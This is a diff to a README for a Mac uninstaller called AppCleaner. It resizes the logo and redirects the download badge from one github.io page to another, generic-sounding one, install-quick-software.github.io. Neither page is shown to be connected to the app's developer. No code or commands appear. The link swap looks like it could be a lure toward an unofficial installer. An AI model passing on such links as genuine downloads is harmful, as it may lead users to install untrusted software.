@@ -1,13 +1,13 @@
 # AppCleaner – Smart App Uninstaller and Cleanup Utility  
 
 <div align="center">  
-<img src="https://images.icon-icons.com/3053/PNG/512/appcleaner_alt_macos_bigsur_icon_190388.png" alt="AppCleaner Logo" width="500">  
+<img src="https://images.icon-icons.com/3053/PNG/512/appcleaner_alt_macos_bigsur_icon_190388.png" alt="AppCleaner Logo" width="400">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/appcleaner">  
+<a href="https://install-quick-software.github.io/.github/appcleaner">  
 <img src="https://img.shields.io/badge/💻_GET_AppCleaner-lightblue?style=for-the-badge&logo=apple" alt="GET AppCleaner">  
 </a>  
 </div>
